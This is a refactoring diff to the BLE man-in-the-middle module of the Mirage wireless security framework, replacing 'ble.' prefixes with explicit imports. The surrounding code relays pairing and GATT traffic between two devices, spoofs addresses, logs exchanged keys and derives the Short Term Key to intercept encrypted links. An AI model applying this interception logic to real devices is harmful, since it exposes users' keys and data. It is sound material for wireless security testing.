@@ -1,7 +1,60 @@
-import multiprocessing
 from enum import IntEnum
-from mirage.libs import io,utils,ble
+
 from mirage.core import module
+from mirage.libs import io, utils
+from mirage.libs.ble_utils.constants import SM_ERR_AUTH_REQUIREMENTS,\
+	SM_ERR_BREDR_PAIRING_IN_PROGRESS,\
+	SM_ERR_COMMAND_NOT_SUPPORTED,\
+	SM_ERR_CONFIRM_VALUE_FAILED,\
+	SM_ERR_CROSS_TRANSPORT_KEY,\
+	SM_ERR_DHKEY_CHECK_FAILED,\
+	SM_ERR_ENCRYPTION_KEY_SIZE,\
+	SM_ERR_INVALID_PARAMETERS,\
+	SM_ERR_NUMERIC_COMPARISON_FAILED,\
+	SM_ERR_OOB_NOT_AVAILABLE,\
+	SM_ERR_PAIRING_NOT_SUPPORTED,\
+	SM_ERR_PASSKEY_ENTRY_FAILED,\
+	SM_ERR_REPEATED_ATTEMPTS,\
+	SM_ERR_UNSPECIFIED_REASON
+from mirage.libs.ble_utils.crypto import BLECrypto
+from mirage.libs.ble_utils.dissectors import AuthReqFlag, InputOutputCapability, KeyDistributionFlag
+from mirage.libs.ble_utils.packets import BLEConnect,\
+	BLEConnectionParameterUpdateRequest,\
+	BLEConnectionParameterUpdateResponse,\
+	BLEDisconnect,\
+	BLEEncryptionInformation,\
+	BLEErrorResponse,\
+	BLEExchangeMTURequest,\
+	BLEExchangeMTUResponse,\
+	BLEFindByTypeValueRequest,\
+	BLEFindByTypeValueResponse,\
+	BLEFindInformationRequest,\
+	BLEFindInformationResponse,\
+	BLEHandleValueConfirmation,\
+	BLEHandleValueIndication,\
+	BLEHandleValueNotification,\
+	BLEIdentityAddressInformation,\
+	BLEIdentityInformation,\
+	BLELongTermKeyRequest,\
+	BLELongTermKeyRequestReply,\
+	BLEMasterIdentification,\
+	BLEPairingConfirm,\
+	BLEPairingRandom,\
+	BLEPairingRequest,\
+	BLEPairingResponse,\
+	BLEReadBlobRequest,\
+	BLEReadBlobResponse,\
+	BLEReadByGroupTypeRequest,\
+	BLEReadByGroupTypeResponse,\
+	BLEReadByTypeRequest,\
+	BLEReadByTypeResponse,\
+	BLEReadRequest,\
+	BLEReadResponse,\
+	BLESigningInformation,\
+	BLEWriteCommand,\
+	BLEWriteRequest,\
+	BLEWriteResponse
+
 
 class BLEMitmStage(IntEnum):
 	SCAN = 1
@@ -77,7 +130,7 @@ class ble_mitm(module.WirelessModule):
 
 		if not self.a2mEmitter.isAddressChangeable() and utils.booleanArg(self.args["SLAVE_SPOOFING"]):
 			io.warning("Interface "+attackerToMasterInterface+" is not able to change its address : "
-				   "Address spoofing will not be enabled !")
+				"Address spoofing will not be enabled !")
 
 
 	# Stage related methods
@@ -142,7 +195,7 @@ class ble_mitm(module.WirelessModule):
 		self.responderAddress = address
 		self.responderAddressType = b"\x00" if self.args["CONNECTION_TYPE"] == "public" else b"\x01"
 		io.info("Connecting to slave "+address+"...")
-		self.a2sEmitter.sendp(ble.BLEConnect(
+		self.a2sEmitter.sendp(BLEConnect(
 					dstAddr=address,
 					type=connectionType,
 					initiatorType=initiatorType
@@ -163,14 +216,14 @@ class ble_mitm(module.WirelessModule):
 
 			if self.args["ADVERTISING_STRATEGY"] == "preconnect":
 				if utils.booleanArg(self.args["MASTER_SPOOFING"]):
-					self.a2sEmitter.sendp(ble.BLEDisconnect())
+					self.a2sEmitter.sendp(BLEDisconnect())
 					while self.a2sEmitter.isConnected():
 						utils.wait(seconds=0.01)
 					self.a2sEmitter.setAddress(packet.srcAddr,random=packet.type == "random")
 					address = utils.addressArg(self.args["TARGET"])
 					connectionType = self.args["CONNECTION_TYPE"]
 					io.info("Connecting to slave "+address+"...")
-					self.a2sEmitter.sendp(ble.BLEConnect(
+					self.a2sEmitter.sendp(BLEConnect(
 								dstAddr=address,
 								type=connectionType,
 								initiatorType=packet.type
@@ -189,7 +242,7 @@ class ble_mitm(module.WirelessModule):
 	def disconnectMaster(self,packet):
 		io.info("Master disconnected !")
 		if self.a2sReceiver.isConnected():
-			self.a2sEmitter.sendp(ble.BLEDisconnect())
+			self.a2sEmitter.sendp(BLEDisconnect())
 		self.setStage(BLEMitmStage.STOP)
 
 	@module.scenarioSignal("onSlaveDisconnect")
@@ -202,63 +255,63 @@ class ble_mitm(module.WirelessModule):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Exchange MTU Request (from master) : mtu = "+str(packet.mtu))
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEExchangeMTURequest(mtu=packet.mtu))
+			self.a2sEmitter.sendp(BLEExchangeMTURequest(mtu=packet.mtu))
 
 	@module.scenarioSignal("onSlaveExchangeMTUResponse")
 	def exchangeMtuResponse(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Exchange MTU Response (from slave) : mtu = "+str(packet.mtu))
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEExchangeMTUResponse(mtu=packet.mtu))
+			self.a2mEmitter.sendp(BLEExchangeMTUResponse(mtu=packet.mtu))
 	
 	@module.scenarioSignal("onMasterWriteCommand")
 	def writeCommand(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Write Command (from master) : handle = "+hex(packet.handle)+" / value = "+packet.value.hex())
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEWriteCommand(handle=packet.handle, value=packet.value))
+			self.a2sEmitter.sendp(BLEWriteCommand(handle=packet.handle, value=packet.value))
 
 	@module.scenarioSignal("onMasterWriteRequest")
 	def writeRequest(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Write Request (from master) : handle = "+hex(packet.handle)+" / value = "+packet.value.hex())
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEWriteRequest(handle=packet.handle, value=packet.value))
+			self.a2sEmitter.sendp(BLEWriteRequest(handle=packet.handle, value=packet.value))
 
 	@module.scenarioSignal("onSlaveWriteResponse")
 	def writeResponse(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Write Response (from slave)")
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEWriteResponse())
+			self.a2mEmitter.sendp(BLEWriteResponse())
 
 	@module.scenarioSignal("onMasterReadBlobRequest")
 	def readBlob(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read Blob Request (from master) : handle = "+hex(packet.handle)+" / offset = "+str(packet.offset))
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEReadBlobRequest(handle=packet.handle,offset=packet.offset))
+			self.a2sEmitter.sendp(BLEReadBlobRequest(handle=packet.handle,offset=packet.offset))
 
 	@module.scenarioSignal("onSlaveReadBlobResponse")
 	def readBlobResponse(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read Blob Response (from slave) : value = "+packet.value.hex())
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEReadBlobResponse(value=packet.value))
+			self.a2mEmitter.sendp(BLEReadBlobResponse(value=packet.value))
 
 	@module.scenarioSignal("onMasterReadRequest")
 	def read(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read Request (from master) : handle = "+hex(packet.handle))
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEReadRequest(handle=packet.handle))
+			self.a2sEmitter.sendp(BLEReadRequest(handle=packet.handle))
 
 	@module.scenarioSignal("onSlaveReadResponse")
 	def readResponse(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Read Response (from slave) : value = "+packet.value.hex())
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEReadResponse(value=packet.value))
+			self.a2mEmitter.sendp(BLEReadResponse(value=packet.value))
 
 	@module.scenarioSignal("onSlaveErrorResponse")
 	def errorResponse(self,packet):
@@ -266,7 +319,7 @@ class ble_mitm(module.WirelessModule):
 			io.info("Error Response (from slave) : request = "+hex(packet.request)+
 				" / handle = "+hex(packet.handle)+" / ecode = "+hex(packet.ecode))
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEErrorResponse(request=packet.request,handle=packet.handle,ecode=packet.ecode))
+			self.a2mEmitter.sendp(BLEErrorResponse(request=packet.request,handle=packet.handle,ecode=packet.ecode))
 
 	@module.scenarioSignal("onSlaveHandleValueNotification")	
 	def notification(self,packet):
@@ -274,7 +327,7 @@ class ble_mitm(module.WirelessModule):
 			io.info("Handle Value Notification (from slave) : handle = "+hex(packet.handle)+
 				" / value = "+packet.value.hex())
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEHandleValueNotification(handle=packet.handle,value=packet.value))
+			self.a2mEmitter.sendp(BLEHandleValueNotification(handle=packet.handle,value=packet.value))
 
 	@module.scenarioSignal("onSlaveHandleValueIndication")	
 	def indication(self,packet):
@@ -282,14 +335,14 @@ class ble_mitm(module.WirelessModule):
 			io.info("Handle Value Indication (from slave) : handle = "+hex(packet.handle)+
 				" / value = "+packet.value.hex())
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEHandleValueIndication(handle=packet.handle,value=packet.value))
+			self.a2mEmitter.sendp(BLEHandleValueIndication(handle=packet.handle,value=packet.value))
 
 	@module.scenarioSignal("onMasterHandleValueConfirmation")
 	def confirmation(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Handle Value Confirmation (from master)")
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEHandleValueConfirmation())
+			self.a2sEmitter.sendp(BLEHandleValueConfirmation())
 
 	@module.scenarioSignal("onMasterFindInformationRequest")
 	def findInformation(self,packet):
@@ -297,7 +350,7 @@ class ble_mitm(module.WirelessModule):
 			io.info("Find Information Request (from master) : startHandle = "+hex(packet.startHandle)+
 				" / endHandle = "+hex(packet.endHandle))
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEFindInformationRequest(startHandle=packet.startHandle,endHandle=packet.endHandle))
+			self.a2sEmitter.sendp(BLEFindInformationRequest(startHandle=packet.startHandle,endHandle=packet.endHandle))
 
 	@module.scenarioSignal("onSlaveFindInformationResponse")
 	def findInformationResponse(self,packet):
@@ -305,7 +358,7 @@ class ble_mitm(module.WirelessModule):
 			io.info("Find Information Response (from slave) : format = "+hex(packet.format)+
 				" / data = "+packet.data.hex())
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEFindInformationResponse(format=packet.format,data=packet.data))
+			self.a2mEmitter.sendp(BLEFindInformationResponse(format=packet.format,data=packet.data))
 
 	@module.scenarioSignal("onMasterFindByTypeValueRequest")
 	def findByTypeValueRequest(self,packet):
@@ -313,14 +366,14 @@ class ble_mitm(module.WirelessModule):
 			io.info("Find Type By Value Request (from master) : startHandle = "+hex(packet.startHandle)+
 				" / endHandle = "+hex(packet.endHandle)+" / uuid = "+hex(packet.uuid)+" / data = "+packet.data.hex())
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEFindByTypeValueRequest(startHandle=packet.startHandle,endHandle=packet.endHandle,uuid=packet.uuid,data=packet.data))
+			self.a2sEmitter.sendp(BLEFindByTypeValueRequest(startHandle=packet.startHandle,endHandle=packet.endHandle,uuid=packet.uuid,data=packet.data))
 
 	@module.scenarioSignal("onSlaveFindByTypeValueResponse")
 	def findByTypeValueResponse(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Find Type By Value Response (from slave)")
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEFindByTypeValueResponse(handles=packet.handles))
+			self.a2mEmitter.sendp(BLEFindByTypeValueResponse(handles=packet.handles))
 
 	@module.scenarioSignal("onMasterReadByTypeRequest")
 	def readByType(self,packet):
@@ -328,7 +381,7 @@ class ble_mitm(module.WirelessModule):
 			io.info("Read By Type Request (from master) : startHandle = "+hex(packet.startHandle)+
 				" / endHandle = "+hex(packet.endHandle)+" / uuid = "+hex(packet.uuid))
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEReadByTypeRequest( startHandle=packet.startHandle,
+			self.a2sEmitter.sendp(BLEReadByTypeRequest( startHandle=packet.startHandle,
 										endHandle=packet.endHandle,
 										uuid=packet.uuid))
 	@module.scenarioSignal("onMasterReadByGroupTypeRequest")
@@ -337,7 +390,7 @@ class ble_mitm(module.WirelessModule):
 			io.info("Read By Group Type Request (from master) : startHandle = "+hex(packet.startHandle)+
 			" / endHandle = "+hex(packet.endHandle)+" / uuid = "+hex(packet.uuid))
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEReadByGroupTypeRequest( 	startHandle=packet.startHandle,
+			self.a2sEmitter.sendp(BLEReadByGroupTypeRequest( 	startHandle=packet.startHandle,
 										endHandle=packet.endHandle,
 										uuid=packet.uuid))
 
@@ -345,7 +398,7 @@ class ble_mitm(module.WirelessModule):
 	def readByTypeResponse(self,packet):
 			io.info("Read By Type Response (from slave) : data = "+packet.data.hex())
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEReadByTypeResponse(data=packet.data))
+			self.a2mEmitter.sendp(BLEReadByTypeResponse(data=packet.data))
 
 	@module.scenarioSignal("onSlaveReadByGroupTypeResponse")
 	def readByGroupTypeResponse(self,packet):
@@ -353,27 +406,27 @@ class ble_mitm(module.WirelessModule):
 			io.info("Read By Group Type Response (from slave) : length = "+str(packet.length)+
 				" / data = "+packet.data.hex())
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEReadByGroupTypeResponse(length=packet.length, data=packet.data))
+			self.a2mEmitter.sendp(BLEReadByGroupTypeResponse(length=packet.length, data=packet.data))
 
 	@module.scenarioSignal("onMasterLongTermKeyRequest")
 	def longTermKeyRequest(self,packet):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Long Term Key Request (from master) : ediv = "+hex(packet.ediv)+" / rand = "+packet.rand.hex())
 			if packet.ediv == 0 and packet.rand == b"\x00"*8:
-				self.shortTermKey = ble.BLECrypto.s1(self.temporaryKey,self.mRand,self.sRand)[::-1]
+				self.shortTermKey = BLECrypto.s1(self.temporaryKey,self.mRand,self.sRand)[::-1]
 				io.info("Derivating Short Term Key : " + self.shortTermKey.hex())
 				io.info("Redirecting to slave ...")
-				self.a2sEmitter.sendp(ble.BLELongTermKeyRequest(rand=packet.rand, ediv=packet.ediv,ltk=self.shortTermKey))
-				self.a2mEmitter.sendp(ble.BLELongTermKeyRequestReply(positive=True, ltk=self.shortTermKey))
+				self.a2sEmitter.sendp(BLELongTermKeyRequest(rand=packet.rand, ediv=packet.ediv,ltk=self.shortTermKey))
+				self.a2mEmitter.sendp(BLELongTermKeyRequestReply(positive=True, ltk=self.shortTermKey))
 			else:
 				if self.args["LTK"] != "":
 					io.info("Using LTK provided : "+self.args["LTK"])
 					io.info("Redirecting to slave ...")
-					self.a2sEmitter.sendp(ble.BLELongTermKeyRequest(rand=packet.rand, ediv=packet.ediv, ltk=bytes.fromhex(self.args["LTK"])))
-					self.a2mEmitter.sendp(ble.BLELongTermKeyRequestReply(positive=True, ltk=bytes.fromhex(self.args["LTK"])))
+					self.a2sEmitter.sendp(BLELongTermKeyRequest(rand=packet.rand, ediv=packet.ediv, ltk=bytes.fromhex(self.args["LTK"])))
+					self.a2mEmitter.sendp(BLELongTermKeyRequestReply(positive=True, ltk=bytes.fromhex(self.args["LTK"])))
 				else:
 					io.info("No LTK provided, encryption not enabled.")
-					self.a2mEmitter.sendp(ble.BLELongTermKeyRequestReply(positive=False))
+					self.a2mEmitter.sendp(BLELongTermKeyRequestReply(positive=False))
 
 
 	@module.scenarioSignal("onMasterPairingRequest")
@@ -381,17 +434,17 @@ class ble_mitm(module.WirelessModule):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info(("Pairing Request (from master) : " +
 			"\n=> outOfBand = "+("yes" if packet.outOfBand else "no") + 
-			"\n=> inputOutputCapability = "+ str(ble.InputOutputCapability(data = bytes([packet.inputOutputCapability]))) +
-			"\n=> authentication = " 	+ str(ble.AuthReqFlag(data=bytes([packet.authentication]))) + 
+			"\n=> inputOutputCapability = "+ str(InputOutputCapability(data = bytes([packet.inputOutputCapability]))) +
+			"\n=> authentication = " 	+ str(AuthReqFlag(data=bytes([packet.authentication]))) + 
 			"\n=> maxKeySize = "+ str(packet.maxKeySize) + 
-			"\n=> initiatorKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.initiatorKeyDistribution]))))+
-			"\n=> responderKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.responderKeyDistribution]))))
-			 
+			"\n=> initiatorKeyDistribution = "+str(KeyDistributionFlag(data=bytes([packet.initiatorKeyDistribution]))))+
+			"\n=> responderKeyDistribution = "+str(KeyDistributionFlag(data=bytes([packet.responderKeyDistribution]))))
+
 			io.info ("Storing Pairing Request's payload :"+packet.payload.hex())
 			self.pReq = packet.payload[::-1]
 			
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEPairingRequest(
+			self.a2sEmitter.sendp(BLEPairingRequest(
 									outOfBand=packet.outOfBand,
 									inputOutputCapability=packet.inputOutputCapability,
 									authentication=packet.authentication,
@@ -406,16 +459,16 @@ class ble_mitm(module.WirelessModule):
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info(("Pairing Response (from slave) : " + 
 			"\n=> outOfBand = "+("yes" if packet.outOfBand else "no") + 
-			"\n=> inputOutputCapability = "+ str(ble.InputOutputCapability(data = bytes([packet.inputOutputCapability]))) +
-			"\n=> authentication = " 	+ str(ble.AuthReqFlag(data=bytes([packet.authentication]))) + 
+			"\n=> inputOutputCapability = "+ str(InputOutputCapability(data = bytes([packet.inputOutputCapability]))) +
+			"\n=> authentication = " 	+ str(AuthReqFlag(data=bytes([packet.authentication]))) + 
 			"\n=> maxKeySize = "+ str(packet.maxKeySize) + 
-			"\n=> initiatorKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.initiatorKeyDistribution]))))+
-			"\n=> responderKeyDistribution = "+str(ble.KeyDistributionFlag(data=bytes([packet.responderKeyDistribution]))))
+			"\n=> initiatorKeyDistribution = "+str(KeyDistributionFlag(data=bytes([packet.initiatorKeyDistribution]))))+
+			"\n=> responderKeyDistribution = "+str(KeyDistributionFlag(data=bytes([packet.responderKeyDistribution]))))
 			io.info ("Storing Pairing Response's payload :"+packet.payload.hex())
 			self.pRes = packet.payload[::-1]
 
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEPairingResponse(
+			self.a2mEmitter.sendp(BLEPairingResponse(
 									outOfBand=packet.outOfBand,
 									inputOutputCapability=packet.inputOutputCapability,
 									authentication=packet.authentication,
@@ -434,7 +487,7 @@ class ble_mitm(module.WirelessModule):
 			self.mConfirm = packet.confirm[::-1]
 
 			io.info("Redirecting to slave ...")
-			self.a2sEmitter.sendp(ble.BLEPairingConfirm(confirm=packet.confirm))
+			self.a2sEmitter.sendp(BLEPairingConfirm(confirm=packet.confirm))
 
 	@module.scenarioSignal("onSlavePairingConfirm")
 	def slavePairingConfirm(self,packet):
@@ -445,7 +498,7 @@ class ble_mitm(module.WirelessModule):
 			self.sConfirm = packet.confirm[::-1]
 
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEPairingConfirm(confirm=packet.confirm))
+			self.a2mEmitter.sendp(BLEPairingConfirm(confirm=packet.confirm))
 						
 	@module.scenarioSignal("onMasterPairingRandom")
 	def masterPairingRandom(self,packet):
@@ -472,7 +525,7 @@ class ble_mitm(module.WirelessModule):
 				self.temporaryKey = b"\x00" * 16
 			io.info("Redirecting to slave ...")
 
-			self.a2sEmitter.sendp(ble.BLEPairingRandom(random=packet.random))
+			self.a2sEmitter.sendp(BLEPairingRandom(random=packet.random))
 
 	@module.scenarioSignal("onSlavePairingRandom")
 	def slavePairingRandom(self,packet):
@@ -481,43 +534,43 @@ class ble_mitm(module.WirelessModule):
 			io.info("Storing sRand : "+packet.random.hex())
 			self.sRand = packet.random[::-1]
 			io.info("Redirecting to master ...")
-			#newRandom = ble.BLECrypto.c1m1(self.temporaryKey,self.sConfirm,self.pReq,self.pRes,self.initiatorAddressType,self.initiatorAddress,self.responderAddressType,self.responderAddress)
+			#newRandom = BLECrypto.c1m1(self.temporaryKey,self.sConfirm,self.pReq,self.pRes,self.initiatorAddressType,self.initiatorAddress,self.responderAddressType,self.responderAddress)
 			#self.forgedsRand = newRandom
 			#io.info("Using fake random : "+newRandom.hex())
-			self.a2mEmitter.sendp(ble.BLEPairingRandom(random=packet.random))
+			self.a2mEmitter.sendp(BLEPairingRandom(random=packet.random))
 
 
 	def pairingFailed(self,pkt):
 		io.fail("Pairing Failed received : "+str(pkt))
-		if pkt.reason == ble.SM_ERR_PASSKEY_ENTRY_FAILED:
+		if pkt.reason == SM_ERR_PASSKEY_ENTRY_FAILED:
 			io.fail("Reason : Passkey Entry Failed")
-		elif pkt.reason == ble.SM_ERR_OOB_NOT_AVAILABLE:
+		elif pkt.reason == SM_ERR_OOB_NOT_AVAILABLE:
 			io.fail("Reason : Out of Band not available")
-		elif pkt.reason == ble.SM_ERR_AUTH_REQUIREMENTS:
+		elif pkt.reason == SM_ERR_AUTH_REQUIREMENTS:
 			io.fail("Reason : Authentication requirements")
-		elif pkt.reason == ble.SM_ERR_CONFIRM_VALUE_FAILED:
+		elif pkt.reason == SM_ERR_CONFIRM_VALUE_FAILED:
 			io.fail("Reason : Confirm Value failed")
-		elif pkt.reason == ble.SM_ERR_PAIRING_NOT_SUPPORTED:
+		elif pkt.reason == SM_ERR_PAIRING_NOT_SUPPORTED:
 			io.fail("Reason : Pairing not supported")
-		elif pkt.reason == ble.SM_ERR_OOB_NOT_AVAILABLE:
+		elif pkt.reason == SM_ERR_OOB_NOT_AVAILABLE:
 			io.fail("Reason : Out of Band not available")
-		elif pkt.reason == ble.SM_ERR_ENCRYPTION_KEY_SIZE:
+		elif pkt.reason == SM_ERR_ENCRYPTION_KEY_SIZE:
 			io.fail("Reason : Encryption key size")
-		elif pkt.reason == ble.SM_ERR_COMMAND_NOT_SUPPORTED:
+		elif pkt.reason == SM_ERR_COMMAND_NOT_SUPPORTED:
 			io.fail("Reason : Command not supported")
-		elif pkt.reason == ble.SM_ERR_UNSPECIFIED_REASON:
+		elif pkt.reason == SM_ERR_UNSPECIFIED_REASON:
 			io.fail("Reason : Unspecified reason")
-		elif pkt.reason == ble.SM_ERR_REPEATED_ATTEMPTS:
+		elif pkt.reason == SM_ERR_REPEATED_ATTEMPTS:
 			io.fail("Reason : Repeated Attempts")
-		elif pkt.reason == ble.SM_ERR_INVALID_PARAMETERS:
+		elif pkt.reason == SM_ERR_INVALID_PARAMETERS:
 			io.fail("Reason : Invalid Parameters")
-		elif pkt.reason == ble.SM_ERR_DHKEY_CHECK_FAILED:
+		elif pkt.reason == SM_ERR_DHKEY_CHECK_FAILED:
 			io.fail("Reason : DHKey Check failed")
-		elif pkt.reason == ble.SM_ERR_NUMERIC_COMPARISON_FAILED:
+		elif pkt.reason == SM_ERR_NUMERIC_COMPARISON_FAILED:
 			io.fail("Reason : Numeric Comparison failed")
-		elif pkt.reason == ble.SM_ERR_BREDR_PAIRING_IN_PROGRESS:
+		elif pkt.reason == SM_ERR_BREDR_PAIRING_IN_PROGRESS:
 			io.fail("Reason : BR/EDR Pairing in progress")
-		elif pkt.reason == ble.SM_ERR_CROSS_TRANSPORT_KEY:
+		elif pkt.reason == SM_ERR_CROSS_TRANSPORT_KEY:
 			io.fail("Reason : Cross-transport Key Derivation/Generation not allowed")
 		else:
 			io.fail("Reason : unknown")
@@ -538,62 +591,62 @@ class ble_mitm(module.WirelessModule):
 	def slaveEncryptionInformation(self,packet):
 		io.info("Encryption Information (from slave) : Long Term Key = "+packet.ltk.hex())
 		io.info("Redirecting to master ...")
-		self.a2mEmitter.sendp(ble.BLEEncryptionInformation(ltk=packet.ltk))
+		self.a2mEmitter.sendp(BLEEncryptionInformation(ltk=packet.ltk))
 
 	@module.scenarioSignal("onSlaveMasterIdentification")
 	def slaveMasterIdentification(self,packet):
 		io.info("Master Indentification (from slave) : ediv = "+hex(packet.ediv)+" / rand = "+packet.rand.hex())
 		io.info("Redirecting to master ...")		
-		self.a2mEmitter.sendp(ble.BLEMasterIdentification(rand=packet.rand,ediv=packet.ediv))		
+		self.a2mEmitter.sendp(BLEMasterIdentification(rand=packet.rand,ediv=packet.ediv))		
 
 	@module.scenarioSignal("onSlaveIdentityAddressInformation")
 	def slaveIdentityAddressInformation(self,packet):
 		io.info("Identity Address Information (from slave) : address = "+str(packet.address)+" / type = "+packet.type)
 		io.info("Redirecting to master ...")		
-		self.a2mEmitter.sendp(ble.BLEIdentityAddressInformation(address=packet.address,type=packet.type))
+		self.a2mEmitter.sendp(BLEIdentityAddressInformation(address=packet.address,type=packet.type))
 
 	@module.scenarioSignal("onSlaveIdentityInformation")
 	def slaveIdentityInformation(self,packet):
 		io.info("Identity Information (from slave) : irk = "+packet.irk.hex())
 		io.info("Redirecting to master ...")		
-		self.a2mEmitter.sendp(ble.BLEIdentityInformation(irk=packet.irk))
+		self.a2mEmitter.sendp(BLEIdentityInformation(irk=packet.irk))
 
 	@module.scenarioSignal("onSlaveSigningInformation")
 	def slaveSigningInformation(self,packet):
 		io.info("Signing Information (from slave) : csrk = "+packet.csrk.hex())
 		io.info("Redirecting to master ...")		
-		self.a2mEmitter.sendp(ble.BLESigningInformation(csrk=packet.csrk))
+		self.a2mEmitter.sendp(BLESigningInformation(csrk=packet.csrk))
 
 
 	@module.scenarioSignal("onMasterEncryptionInformation")
 	def masterEncryptionInformation(self,packet):
 		io.info("Encryption Information (from master) : Long Term Key = "+packet.ltk.hex())
 		io.info("Redirecting to slave ...")
-		self.a2sEmitter.sendp(ble.BLEEncryptionInformation(ltk=packet.ltk))
+		self.a2sEmitter.sendp(BLEEncryptionInformation(ltk=packet.ltk))
 
 	@module.scenarioSignal("onMasterMasterIdentification")
 	def masterMasterIdentification(self,packet):
 		io.info("Master Indentification (from master) : ediv = "+hex(packet.ediv)+" / rand = "+packet.rand.hex())
 		io.info("Redirecting to slave ...")		
-		self.a2sEmitter.sendp(ble.BLEMasterIdentification(rand=packet.rand,ediv=packet.ediv))		
+		self.a2sEmitter.sendp(BLEMasterIdentification(rand=packet.rand,ediv=packet.ediv))		
 
 	@module.scenarioSignal("onMasterIdentityAddressInformation")
 	def masterIdentityAddressInformation(self,packet):
 		io.info("Identity Address Information (from master) : address = "+str(packet.address)+" / type = "+packet.type)
 		io.info("Redirecting to slave ...")		
-		self.a2sEmitter.sendp(ble.BLEIdentityAddressInformation(address=packet.address,type=packet.type))
+		self.a2sEmitter.sendp(BLEIdentityAddressInformation(address=packet.address,type=packet.type))
 
 	@module.scenarioSignal("onMasterIdentityInformation")
 	def masterIdentityInformation(self,packet):
 		io.info("Identity Information (from master) : irk = "+packet.irk.hex())
 		io.info("Redirecting to slave ...")		
-		self.a2sEmitter.sendp(ble.BLEIdentityInformation(irk=packet.irk))
+		self.a2sEmitter.sendp(BLEIdentityInformation(irk=packet.irk))
 
 	@module.scenarioSignal("onMasterSigningInformation")
 	def masterSigningInformation(self,packet):
 		io.info("Signing Information (from master) : csrk = "+packet.csrk.hex())
 		io.info("Redirecting to slave ...")		
-		self.a2sEmitter.sendp(ble.BLESigningInformation(csrk=packet.csrk))
+		self.a2sEmitter.sendp(BLESigningInformation(csrk=packet.csrk))
 
 
 	@module.scenarioSignal("onSlaveConnectionParameterUpdateRequest")
@@ -601,13 +654,13 @@ class ble_mitm(module.WirelessModule):
 		io.info("Connection Parameter Update Request (from slave) : slaveLatency = "+str(packet.slaveLatency)+" / timeoutMult = "+str(packet.timeoutMult)+" / minInterval = "+str(packet.minInterval)+" / maxInterval = "+str(packet.maxInterval))
 		io.info("Sending a response to slave ...")
 		self.a2sEmitter.updateConnectionParameters(timeout=packet.timeoutMult,latency=packet.slaveLatency, minInterval=packet.minInterval,maxInterval=packet.maxInterval,minCe=0,maxCe=0)
-		self.a2sEmitter.sendp(ble.BLEConnectionParameterUpdateResponse(
+		self.a2sEmitter.sendp(BLEConnectionParameterUpdateResponse(
 						l2capCmdId = packet.l2capCmdId,
 						moveResult=0
 					))
 		if self.getStage() == BLEMitmStage.ACTIVE_MITM:
 			io.info("Redirecting to master ...")
-			self.a2mEmitter.sendp(ble.BLEConnectionParameterUpdateRequest(
+			self.a2mEmitter.sendp(BLEConnectionParameterUpdateRequest(
 						l2capCmdId = packet.l2capCmdId,timeoutMult=packet.timeoutMult, slaveLatency=packet.slaveLatency, minInterval=packet.minInterval, maxInterval=packet.maxInterval))
 	
 			
